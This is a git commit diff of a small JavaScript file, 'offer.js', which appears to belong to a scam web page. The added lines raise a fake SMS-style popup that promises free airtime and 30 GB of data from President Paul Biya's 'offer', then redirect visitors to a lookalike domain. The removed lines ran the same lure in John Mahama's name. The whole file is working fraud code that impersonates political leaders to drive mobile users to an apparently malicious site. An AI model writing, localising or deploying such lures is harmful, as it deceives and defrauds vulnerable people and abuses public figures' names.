1a8c7a8d3ce7ad15c8c3190f22d9fb5bed74e664
kenycruzk <kenycruzk@gmail.com>
2025-07-26 07:11:50 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '30Go Internet'
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir 5000F de temps dantenne et 30 Go de données gratuites de loffre du PRÉSIDENT PAUL BIYA, veuillez appuyer sur OK pour ACTIVER ','30Go Internet');
+if (password != '30Go Internet') {
+location.href='https://paulbiya.4g-data.info/30Go';
 }
